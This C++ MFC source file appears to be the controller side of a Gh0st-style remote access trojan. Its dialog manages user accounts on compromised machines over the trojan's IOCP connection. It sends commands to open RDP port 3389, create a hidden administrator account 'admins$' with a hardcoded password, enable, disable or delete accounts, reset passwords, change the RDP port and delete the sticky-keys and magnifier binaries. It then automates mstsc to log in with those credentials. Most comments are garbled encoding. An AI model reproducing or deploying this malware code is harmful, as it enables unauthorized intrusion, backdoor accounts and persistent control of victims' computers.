// User.cpp : implementation file
//

#include "stdafx.h"
#include "DHL_yk.h"
#include "User.h"
#include "PcView.h"
#include "InputDlg.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CPcView* g_pConnectView;

/////////////////////////////////////////////////////////////////////////////
// CUser dialog
CUser::CUser(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CUser::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSystemDlg)
	m_net_user = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("������","Netuser","admins$");    //�û�����
	m_net_pass = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("������","Netpass","admin7758");  //��½����
//	m_admin = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("������","NetName","Administrators");  //�û�������
	m_admin = _T("Administrators");
//	m_net_pass = _T("admin7758");
//	m_net_user = _T("admins$");
	m_Port1 = _T("3389");
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SUERES_T));

}


void CUser::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CUser)
	DDX_Control(pDX, IDC_Server_yjx, m_Server_yjx);
	DDX_Control(pDX, IDC_Server_yhx, m_Server_yhx);
	DDX_Control(pDX, IDC_Server_tab, m_Server_tab);
	DDX_Text(pDX, IDC_EDIT_admin, m_admin);
	DDX_Text(pDX, IDC_EDIT_pass, m_net_pass);
	DDX_Text(pDX, IDC_EDIT_user, m_net_user);
	DDX_Text(pDX, IDC_LONGRANGE_Port1, m_Port1);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CUser, CDialog)
	//{{AFX_MSG_MAP(CUser)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_KS_3389, OnKs3389)
	ON_BN_CLICKED(IDC_NET_ADD, OnNetAdd)
	ON_NOTIFY(TCN_SELCHANGE, IDC_Server_tab, OnSelchangeServertab)
	ON_NOTIFY(NM_RCLICK, IDC_Server_yjx, OnClickServeryjx)
	ON_NOTIFY(NM_RCLICK, IDC_Server_yhx, OnClickServeryhx)
	ON_COMMAND(ID_SER_sx, OnSERsx)
	ON_COMMAND(ID_SER_qy, OnSERqy)
	ON_COMMAND(ID_SER_jy, OnSERjy)
	ON_COMMAND(ID_SER_sc, OnSERsc)
	ON_COMMAND(ID_SER_Cipher, OnSERCipher)
	ON_BN_CLICKED(IDC_LONGRANGE_PortMod, OnLONGRANGEPortMod)
	ON_BN_CLICKED(IDC_LJ_3389, OnLj3389)
	ON_EN_CHANGE(IDC_EDIT_user, OnChangeEDITuser)
	ON_EN_CHANGE(IDC_EDIT_pass, OnChangeEDITpass)
	ON_BN_CLICKED(IDC_SHIFTOSK, OnShiftosk)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CUser message handlers
void CUser::OnReceiveComplete()
{
//	m_nCount++;
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_USER_LIST:   //�û��б� 
		ShowProcessListp();
		break;
	case COMMAND_NET_YHSX: // 
//		ShowProcessListp();
		break;
	default:
		// ���䷢���쳣����
//		SendException();
		break;
	}
}

void CUser::OnKs3389()   //����3389�˿�
{
	CString temp = "3389";
    int nPacketLength = (temp.GetLength() + 2);
    LPBYTE lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
    lpPacket[0] = COMMAND_OPEN_3389;
	char *tempurl = temp.GetBuffer(temp.GetLength() + 1);	//CStringת��Ϊchar*
	temp.ReleaseBuffer();
    memcpy(lpPacket + 1, tempurl, nPacketLength - 1);
	m_iocpServer->Send(m_pContext,lpPacket, nPacketLength);
    LocalFree(lpPacket);
}

void CUser::GetProcess_yhx()  //�û��б�
{
	BYTE bToken = COMMAND_USER_LIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}
void CUser::GetProcess_yjx()  //�����б�
{
	BYTE bToken = COMMAND_NETWORK_LIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CUser::ServertabWindow()
{
	switch (m_Server_tab.GetCurSel())
	{
	case 0:
		m_Server_yhx.ShowWindow(SW_SHOW);
		m_Server_yjx.ShowWindow(SW_HIDE);
		if (m_Server_yhx.GetItemCount() == 0)
			GetProcess_yhx();
		break;
	case 1:
		m_Server_yhx.ShowWindow(SW_HIDE);
		m_Server_yjx.ShowWindow(SW_SHOW);
		if (m_Server_yjx.GetItemCount() == 0)
			GetProcess_yjx();
		break;

	break;			
	}
}

BOOL CUser::OnInitDialog() 
{
	CDialog::OnInitDialog();
	

	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon


	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_net_ip = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
//	str.Format("\\\\%s - ����������", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	str.Format("\\\\%s - ����������", m_net_ip);
	SetWindowText(str);

	m_Server_tab.InsertItem(0, "�û�����");
	m_Server_tab.InsertItem(1, "�������");


	m_Server_yhx.SetExtendedStyle( LVS_EX_FULLROWSELECT);
	m_Server_yhx.InsertColumn(0, "�û�", LVCFMT_LEFT, 110);
	m_Server_yhx.InsertColumn(1, "�û���", LVCFMT_LEFT, 155);
	m_Server_yhx.InsertColumn(3, "״̬", LVCFMT_LEFT, 45);

	m_Server_yjx.SetExtendedStyle( LVS_EX_FULLROWSELECT);
	m_Server_yjx.InsertColumn(0, "��������", LVCFMT_LEFT, 320);


	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SUER_1));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SUER_2));
	m_Server_yhx.SetImageList(&m_ImgList,LVSIL_SMALL);


//	AdjustListr();
	ShowProcessListp();
	ServertabWindow();

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CUser::OnClose()
{
	closesocket(m_pContext->m_Socket);   //�Ͽ���������
	CDialog::OnClose();
}

void CUser::OnSelchangeServertab(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	ServertabWindow();
	*pResult = 0;
}

void CUser::AdjustListr()
{
	RECT	rectClient;
	RECT	rectList;
	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 29;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom;
	
	m_Server_yhx.MoveWindow(&rectList);
	m_Server_yjx.MoveWindow(&rectList);

//	m_list_process.SetColumnWidth(2, rectList.right - m_list_process.GetColumnWidth(0) - m_list_process.GetColumnWidth(1) - 20);
}

void CUser::ShowProcessListp()
{
	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char	*DisplayName= NULL;
	char	*ServiceName= NULL;
	char	*serfile= NULL;
	char	*serbjnm= "����";
	char	*serPort= NULL;
	DWORD	dwOffset = 0;
	CString str;
	m_Server_yhx.DeleteAllItems();

	char stmk;
	int i;
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		DisplayName = lpBuffer + dwOffset;
		ServiceName = DisplayName + lstrlen(DisplayName) +1;
		serfile= ServiceName + lstrlen(ServiceName) +1;
		serPort= serfile + lstrlen(serfile) +1;

		if(!strcmp(serfile,serbjnm))
			stmk=0;
		else
			stmk=1;

		m_Server_yhx.InsertItem(i, DisplayName,stmk);
		m_Server_yhx.SetItemText(i, 1, ServiceName);
  		m_Server_yhx.SetItemText(i, 2, serfile);

		dwOffset += lstrlen(DisplayName) + lstrlen(ServiceName) + lstrlen(serfile) + lstrlen(serPort) + 4;

	}
	str.Format("�û� / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_Server_yhx.SetColumn(0, &lvc);

	SerPort_P= serPort;
	SetDlgItemText(IDC_LONGRANGE_Port0,serPort);   //�˿���ʾ

}

void CUser::OnClickServeryjx(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here

	*pResult = 0;
}

void CUser::OnClickServeryhx(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here

    CMenu	popup;
	popup.LoadMenu(IDR_SERT_YJ);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
	
	if (m_Server_yhx.GetSelectedCount() == 0)       //���û��ѡ��
	{ 
		for (int i = 1; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //�˵�ȫ�����
		}

	}
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);

	*pResult = 0;
}

void CUser::OnSERsx()   //�û� ˢ��
{
	// TODO: Add your command handler code here

	BYTE bToken = COMMAND_NET_YHSX;
	m_iocpServer->Send(m_pContext, &bToken, 1);
	
}

void CUser::Seruer_shezhi(UINT User_p)   //�ʻ����ú��� ����/����
{
	// TODO: Add your command handler code here
	CListCtrl	*pListCtrl = NULL;

	if (m_Server_yhx.IsWindowVisible())
		pListCtrl = &m_Server_yhx;
	else if (m_Server_yjx.IsWindowVisible())
		pListCtrl = &m_Server_yjx;
	else
		return;

	if(pListCtrl->GetSelectedCount() == NULL)
	{
		MessageBox("��ѡ���û���!!...", "������ʾ...", MB_YESNO | MB_ICONWARNING);
		return ;
	}
	if(User_p==2)  //�ʻ�ɾ����ʾ
	{
		if (MessageBox("�����Ҫɾ���ʻ�����", "�ʻ�ɾ����ʾ...", MB_YESNO | MB_ICONWARNING) == IDNO)
		    return;
	}

	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); 
	
	if(pos != NULL) 
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		CString pContexe = pListCtrl->GetItemText(nItem,0);

		int nPacketLength = (strlen(pContexe) + 1);;
	    LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	    if(User_p==0)
		{
	        lpBuffer[0] = COMMAND_NET_START;		// �ʻ�����
		}
	    else if(User_p==1)
		{
		    lpBuffer[0] = COMMAND_NET_DISABLE;		// �ʻ�����
		}
	    else if(User_p==2)
		{
		    lpBuffer[0] = COMMAND_NET_DEL;		    // ɾ���ʻ�
		}

		memcpy(lpBuffer + dwOffset, pContexe, lstrlen(pContexe) + 1);
		dwOffset += lstrlen(pContexe) + 1;
		m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	}

}

void CUser::OnSERqy()   //�ʻ� ����
{
    Seruer_shezhi(0);   
}

void CUser::OnSERjy()  //�ʻ� ����
{
	Seruer_shezhi(1);   
}

void CUser::OnSERsc()  //�ʻ� ɾ��
{
	Seruer_shezhi(2);   
}

void CUser::OnSERCipher()   //��������
{
	CString strTitle;
	CListCtrl	*pListCtrl = NULL;

	if (m_Server_yhx.IsWindowVisible())
		pListCtrl = &m_Server_yhx;
	else if (m_Server_yjx.IsWindowVisible())
		pListCtrl = &m_Server_yjx;
	else
		return;

	if(pListCtrl->GetSelectedCount() == NULL)
	{
		MessageBox("��ѡ���û���!!...", "������ʾ...", MB_YESNO | MB_ICONWARNING);
		return ;
	}

	strTitle = "�ʻ���½�����޸�...";
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("�������µ�����:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;

	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	if(pos != NULL) 
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		CString pContexe = pListCtrl->GetItemText(nItem,0);
		CString pContmima =dlg.m_str;

		int nPacketLength = (strlen(pContexe) + 1);;
	    LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	    lpBuffer[0] = COMMAND_RENAME_PASSWORD;

		memcpy(lpBuffer + dwOffset, pContexe, lstrlenA(pContexe) + 1);
		dwOffset += lstrlenA(pContexe) + 1;
		memcpy(lpBuffer + dwOffset, pContmima, lstrlenA(pContmima) + 1);
		dwOffset += lstrlenA(pContmima) + 1;

		m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);

	}


}

void CUser::OnNetPreservations()   //�����޸�
{
	// ��������
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("������", "Netuser", m_net_user);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("������", "Netpass", m_net_pass);
}

void CUser::OnNetAdd()   //����û�
{
	CString strTitle;
	CString name , pass , group;

	GetDlgItemText(IDC_EDIT_user, name);
	GetDlgItemText(IDC_EDIT_pass, pass);
	GetDlgItemText(IDC_EDIT_admin, group);
	name.MakeLower();

	if (strlen(name) < 1 || strlen(pass) < 1)
	{
		MessageBox("�������û���������!!...", "������ʾ...", MB_YESNO | MB_ICONWARNING);
		return;
	}

//	int nPacketLength = 2;
	int nPacketLength = (strlen(name) + 1);;
	LPBYTE lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_NET_USER;

	DWORD	dwOffset = 1;
	memcpy(lpPacket + dwOffset, name, lstrlenA(name) + 1);
	dwOffset += lstrlenA(name) + 1;
	memcpy(lpPacket + dwOffset, pass, lstrlenA(pass) + 1);
	dwOffset += lstrlenA(pass) + 1;
	memcpy(lpPacket + dwOffset, group, lstrlenA(group) + 1);
	dwOffset += lstrlenA(group) + 1;

	m_iocpServer->Send(m_pContext,lpPacket, dwOffset);

	OnNetPreservations();   //�����޸�
}

void CUser::OnLONGRANGEPortMod()  //Զ�̶˿��޸�
{
	CString Port_x;
	GetDlgItemText(IDC_LONGRANGE_Port1, Port_x);
	
	if (strlen(Port_x) < 1)
	{
		MessageBox("������˿ں�!!...", "������ʾ...", MB_YESNO | MB_ICONWARNING);
		return;
	}

//	int nPacketLength = 2;
//	LPBYTE lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);

	int nPacketLength = (strlen(Port_x) + 1);;
	LPBYTE lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_SERVER_PORT;

	DWORD	dwOffset = 1;
	memcpy(lpPacket + dwOffset, Port_x, lstrlenA(Port_x) + 1);
	dwOffset += lstrlenA(Port_x) + 1;

	m_iocpServer->Send(m_pContext,lpPacket, dwOffset);
}

HWND GetChildWindow(HWND H_Parent,LPSTR szTitle)
{
	char szText[255]={0};
	HWND htop = GetWindow(H_Parent,GW_CHILD);
	while (htop !=0)
	{
		GetClassNameA(htop,szText,255);
		if (lstrcmpiA(szText,"Button") == 0)
		{
			memset(szText,0,sizeof(szText));
			GetWindowTextA(htop,szText,255);
			if (lstrcmpiA(szText,szTitle) == 0)
			{
				return htop;
			}
		}
		htop =GetWindow(htop,GW_HWNDNEXT);
	}
	return 0;
}
/*
DWORD WINAPI ShieldThread()  //����߳�
{
	BOOL strm = NULL;
	while(1)
	{
		HWND h_wnd = ::FindWindow("#32770","Զ����������");
	    ::ShowWindow(h_wnd,SW_HIDE);   //���ش���

		HWND h_wnda = ::FindWindow("TSSHELLWND",NULL);
		if(h_wnda)
		{
			HWND h_wndb = FindWindowEx(h_wnda,NULL,"TSCAXHOST",NULL);
			HWND h_wndc = FindWindowEx(h_wndb,NULL,"ATL:6A61B2FF",NULL);
			HWND h_wndd = FindWindowEx(h_wndc,NULL,"UIMainClass",NULL);
			HWND h_wnde = FindWindowEx(h_wndd,NULL,"BBARCLASS",NULL); 
			HWND h_wndf = FindWindowEx(h_wndd,NULL,"UIContainerClass",NULL);
			if(!h_wnde)
			{
				if(strm)
				{
				    HWND hConnWnds = FindWindowEx(h_wnd,NULL,"Button","ȡ��");
				    if(hConnWnds)
					{
				        ::SendMessage(hConnWnds,WM_LBUTTONDOWN,0,0);  //����������
                        ::SendMessage(hConnWnds,WM_LBUTTONUP,0,0);    //������̧��
					    break;
					}
				    hConnWnds = FindWindowEx(h_wnd,NULL,"Button","�ر�");
				    if(hConnWnds)
					{
				        ::SendMessage(hConnWnds,WM_LBUTTONDOWN,0,0);  //����������
                        ::SendMessage(hConnWnds,WM_LBUTTONUP,0,0);    //������̧��
				        break;
					}
				}
			}
			else
			{
				strm = TRUE;
			}
		}
	}
    return TRUE; 
}
*/

void CUser::Remotedesktop(CString Net_ips,CString Net_Ports,CString Net_users,CString Net_passs)
{

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
        
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

	CHAR ModuletemDis[MAX_PATH]={0};
	sprintf(ModuletemDis,"%s\\Control\\mstsc.exe",((CGh0stApp *)AfxGetApp())->ModuletemDir);   //����Ŀ¼�ͳ�������
/*
	char szSystemDir[MAX_PATH]={0};
//    memset(szSystemDir,0,sizeof(szSystemDir));
	GetCurrentDirectory(MAX_PATH,(LPTSTR)(szSystemDir));  //���ڻ�ȡ��ǰĿ¼
	strcat(szSystemDir,"\\Control\\mstsc.exe");

	char szSystemDirs[MAX_PATH]={0};
	GetModuleFileName(0,(LPTSTR)&szSystemDirs,sizeof(&szSystemDirs));  //���ڻ�ȡ������·�� 
*/
	if(INVALID_FILE_ATTRIBUTES==GetFileAttributes(ModuletemDis))
	{
//		MessageBox("Զ������mstsc.exe�ļ���ʧ���޷�����Զ������... ","���棡",MB_OK);
		MessageBox(ModuletemDis,"���棡",MB_OK);
		return;
	}
//	CreateThread(0,0,(LPTHREAD_START_ROUTINE)ShieldThread,0,0,0);  //���������߳�
    ShellExecute(NULL,"open",ModuletemDis,NULL,NULL,SW_SHOW);   //�򿪳���

	BOOL Lji3389 = NULL;
	UINT Ljshu = NULL;
	CWnd *pMainWnd = NULL;
	while(true)
	{
		Sleep(200);
		pMainWnd = FindWindow("#32770","Զ����������");

		if (pMainWnd)
			break;
		else
		{
			Ljshu++;
			if(Ljshu>=200)
			{
				MessageBox("����ʧ�ܣ�����������... ","��ʾ��",MB_OK);
				return;
			}
		}
	}

	Ljshu = 0;
	HWND hMainWnd = NULL;
	HWND hComputerIPWnd = NULL;
	HWND hComputerUserNameWnd = NULL;
	HWND hComputerUserPwdWnd = NULL;
	HWND hDomainPwdWnd = NULL;

    hMainWnd = pMainWnd->m_hWnd;

	while ( true )
	{
        HWND hOptionWnd =  (HWND)FindWindowEx(hMainWnd,NULL,"Button","ѡ��(&O) >>");
        if ( hOptionWnd != NULL )
		{
			::SendMessage(hOptionWnd,WM_LBUTTONDOWN,0,0);  //����������
            ::SendMessage(hOptionWnd,WM_LBUTTONUP,0,0);    //������̧��
		}

        HWND hExtWnd = (HWND)FindWindowEx(hMainWnd,NULL,"Button","ѡ��(&O) <<");
        if ( hExtWnd != NULL )
        {
			break;
        }
    }

	Sleep(100);
    HWND hDlgWnd = (HWND)FindWindowEx(hMainWnd,NULL,"#32770","");
    if ( hDlgWnd == NULL )
    {
		Lji3389 = TRUE;
//        MessageBox("δ�ҵ�Զ�����������ϵ�dialog!");
//       return;
    }
    hComputerIPWnd = (HWND)FindWindowEx(hDlgWnd,NULL,"ComboBoxEx32",NULL);
    if ( hComputerIPWnd == NULL )
    {
		Lji3389 = TRUE;
//        MessageBox("δ�ҵ���дԶ�̼����IP��ַ�Ĵ��ڣ�");
//        return;
    }

    hComputerUserNameWnd = (HWND)FindWindowEx(hDlgWnd,NULL,"Edit",NULL);
    if ( hComputerUserNameWnd == NULL)
    {
		Lji3389 = TRUE;
//        MessageBox("δ�ҵ���дԶ�̼�����û����Ĵ��ڣ�");
//        return;
    }

    hComputerUserPwdWnd = (HWND)FindWindowEx(hDlgWnd,hComputerUserNameWnd,"Edit",NULL);
    if ( hComputerUserPwdWnd == NULL )
    {
		Lji3389 = TRUE;
//        MessageBox("δ�ҵ���дԶ�̼�����û�����Ĵ��ڣ�");
//        return;
    }
    hDomainPwdWnd = (HWND)FindWindowEx(hDlgWnd,hComputerUserPwdWnd,"Edit",NULL);
    if ( hDomainPwdWnd == NULL )
    {
		Lji3389 = TRUE;
//        MessageBox("δ�ҵ���дԶ�̼�����û�����Ĵ��ڣ�");
//        return;
    }
	if(Lji3389)
	{
		Ljshu++;
		if(Ljshu>=50)
		{
		    MessageBox("�ļ����д�������������... ","��ʾ��",MB_OK);
		    return;
		}
	}


    char szComputerIP[100] = {0};
    char szUserName[512] = {0};
    char szUserPwd[512] = {0};

	sprintf(szComputerIP,"%s:%s",Net_ips,Net_Ports);   //��½IP���˿�
	sprintf(szUserName,"%s",Net_users);   //�û���
	sprintf(szUserPwd,"%s",Net_passs);    //����

    ::SendMessage(hComputerIPWnd,WM_SETTEXT,0,(LPARAM)szComputerIP);
    ::SendMessage(hComputerUserNameWnd,WM_SETTEXT,0,(LPARAM)szUserName);
    ::SendMessage(hComputerUserPwdWnd,WM_SETTEXT,0,(LPARAM)szUserPwd);
	::SendMessage(hDomainPwdWnd,WM_SETTEXT,0,NULL);   //�����Ϊ��

    HWND hConnWnd = (HWND)FindWindowEx(hMainWnd,NULL,"Button","����(&N)");

	::SendMessage(hConnWnd,WM_LBUTTONDOWN,0,0);  //����������
    ::SendMessage(hConnWnd,WM_LBUTTONUP,0,0);    //������̧��
	
}

void CUser::OnLj3389() 
{
	Remotedesktop(m_net_ip,SerPort_P,m_net_user,m_net_pass);
	OnNetPreservations();   //�����޸�
}

void CUser::OnChangeEDITuser() 
{
	UpdateData(true);
}

void CUser::OnChangeEDITpass() 
{
    UpdateData(true);
}

void CUser::OnShiftosk()    //����� �Ŵ����
{
	if (MessageBox("��ȷ��Ҫɾ�������\n<ճ�ͼ�������̺ͷŴ�> ��?? ", "��ʾ!", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;

	CString temp = "DELSHIFTOSK";
    int nPacketLength = (temp.GetLength() + 2);
    LPBYTE lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
    lpPacket[0] = COMMAND_DEL_SHIFTOSK;		    
	char *tempurl = temp.GetBuffer(temp.GetLength() + 1);	//CStringת��Ϊchar*
	temp.ReleaseBuffer();
    memcpy(lpPacket + 1, tempurl, nPacketLength - 1);
	m_iocpServer->Send(m_pContext,lpPacket, nPacketLength);
    LocalFree(lpPacket);
}

void CUser::OnCancel() 
{
	// TODO: Add extra cleanup here
	OnClose();
//	CDialog::OnCancel();
}
